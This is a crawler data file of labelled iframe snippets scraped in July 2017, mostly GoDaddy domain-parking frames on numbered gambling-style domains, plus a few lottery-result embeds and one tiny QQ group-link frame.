0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmHmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj53.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2761_20170727_174409/html_200_20170727_174409.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmSjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50031cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1632_20170727_171833/html_200_20170727_171833.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx5BGxhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj9999.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9511_20170727_174545/html_200_20170727_174545.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj58.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1249_20170727_174423/html_200_20170727_174423.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj84.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8921_20170727_174500/html_200_20170727_174500.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj86.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8818_20170727_174502/html_200_20170727_174502.txt
0,"<iframe frameborder=""0"" height=""140"" marginheight=""0"" marginwidth=""0"" scrolling=""no"" src=""https://www.944711.com/xglhc.aspx"" width=""100%""></iframe>",http://06636.net,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3025_20170727_171342/html_200_20170727_171342.txt
0,"<iframe frameborder=""0"" height=""140"" marginheight=""0"" marginwidth=""0"" scrolling=""no"" src=""https://www.944711.com/xglhc.aspx"" width=""100%""></iframe>",http://636470.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6058_20170727_172218/html_200_20170727_172218.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj37.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9519_20170727_174347/html_200_20170727_174347.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj18.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3297_20170727_174312/html_200_20170727_174312.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj35.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5966_20170727_174346/html_200_20170727_174346.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmDjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj40.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5530_20170727_174350/html_200_20170727_174350.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj74.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_402_20170727_174450/html_200_20170727_174450.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmujLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50038cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6420_20170727_171838/html_200_20170727_171838.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD0AP5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj444.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2103_20170727_174355/html_200_20170727_174355.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj65.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6387_20170727_174429/html_200_20170727_174429.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj47.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6121_20170727_174401/html_200_20170727_174402.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmV5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj29.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4555_20170727_174329/html_200_20170727_174329.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj85.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6723_20170727_174501/html_200_20170727_174501.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj94.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8957_20170727_174537/html_200_20170727_174537.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj20.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5582_20170727_174315/html_200_20170727_174315.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj30.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_557_20170727_174331/html_200_20170727_174331.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmLjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj60.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9950_20170727_174425/html_200_20170727_174425.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmLlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj62.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2488_20170727_174427/html_200_20170727_174427.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj57.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1442_20170727_174422/html_200_20170727_174422.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmDlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj42.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3250_20170727_174352/html_200_20170727_174352.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj96.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8186_20170727_174540/html_200_20170727_174540.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmV1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj25.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8894_20170727_174320/html_200_20170727_174320.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwujLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50028cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9206_20170727_171830/html_200_20170727_171830.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj36.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8940_20170727_174346/html_200_20170727_174346.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmDkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj41.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6391_20170727_174351/html_200_20170727_174351.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj19.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3556_20170727_174313/html_200_20170727_174313.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL3BP5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj678.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9889_20170727_174444/html_200_20170727_174444.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj15.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3610_20170727_174310/html_200_20170727_174310.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmtkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj81.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3356_20170727_174457/html_200_20170727_174457.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmpjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj70.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4650_20170727_174447/html_200_20170727_174447.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmDmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj43.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_276_20170727_174353/html_200_20170727_174353.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRjZP5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj100.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1171_20170727_174301/html_200_20170727_174301.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmWjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50032cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4975_20170727_171834/html_200_20170727_171834.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj33.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8204_20170727_174340/html_200_20170727_174340.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj97.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9406_20170727_174541/html_200_20170727_174541.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmtjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj80.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9151_20170727_174456/html_200_20170727_174456.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj87.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3071_20170727_174502/html_200_20170727_174502.txt
0,"<iframe frameborder=""0"" height=""1"" name=""I8"" scrolling=""no"" src=""http://shang.qq.com/wpa/qunwpa?idkey=c95aa95edbccafbae8f40c8481b697ae98669e850199348f7cf8fee10755f357"" target=""_blank"" width=""1""></iframe>",http://605389.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1599_20170727_172217/html_200_20170727_172217.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmtlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj82.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4556_20170727_174458/html_200_20170727_174458.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj64.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1812_20170727_174428/html_200_20170727_174428.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH1AGHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj5555.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1631_20170727_174419/html_200_20170727_174419.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwMjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50026cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3124_20170727_171828/html_200_20170727_171828.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwIjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50025cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_248_20170727_171827/html_200_20170727_171827.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj22.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_882_20170727_174316/html_200_20170727_174316.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj38.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4810_20170727_174348/html_200_20170727_174348.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZmZl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj333.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4091_20170727_174341/html_200_20170727_174341.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp3AmphpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj7777.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4314_20170727_174453/html_200_20170727_174453.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVlZwVhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj2222.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_268_20170727_174317/html_200_20170727_174317.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj76.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8618_20170727_174451/html_200_20170727_174451.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj77.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1837_20170727_174452/html_200_20170727_174452.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRlZl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj123.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3599_20170727_174305/html_200_20170727_174305.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj54.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_841_20170727_174410/html_200_20170727_174410.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj10.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_745_20170727_174300/html_200_20170727_174300.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmMjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50036cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9300_20170727_171836/html_200_20170727_171836.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx5BF5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj999.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2323_20170727_174544/html_200_20170727_174544.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmqjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50037cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2488_20170727_171837/html_200_20170727_171837.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj13.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1369_20170727_174306/html_200_20170727_174306.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD0AQDhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj4444.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1330_20170727_174357/html_200_20170727_174357.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmyjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50039cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9518_20170727_171839/html_200_20170727_171839.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj79.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3926_20170727_174455/html_200_20170727_174455.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj17.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1323_20170727_174312/html_200_20170727_174312.txt
0,"<iframe frameborder=""0"" height=""140"" marginheight=""0"" marginwidth=""0"" scrolling=""no"" src=""https://www.944711.com/xglhc.aspx"" width=""100%""></iframe>",http://934082.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6296_20170727_172839/html_200_20170727_172839.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmIjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50035cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7386_20170727_171835/html_200_20170727_171835.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj67.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4755_20170727_174443/html_200_20170727_174443.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj49.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2601_20170727_174404/html_200_20170727_174404.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj16.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3111_20170727_174311/html_200_20170727_174311.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmHkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj51.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_50_20170727_174407/html_200_20170727_174407.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj75.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2037_20170727_174450/html_200_20170727_174450.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj78.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2219_20170727_174454/html_200_20170727_174454.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj59.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_774_20170727_174424/html_200_20170727_174424.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmHlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj52.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3540_20170727_174408/html_200_20170727_174408.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmV0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj24.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2404_20170727_174319/html_200_20170727_174319.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmOjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50030cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8065_20170727_171832/html_200_20170727_171832.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRkZGRhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj1111.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9161_20170727_174303/html_200_20170727_174303.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/qTIhLKSwoz1hozHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://grandpazaar.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_7863_20170726_190123/html_200_20170726_190123.txt
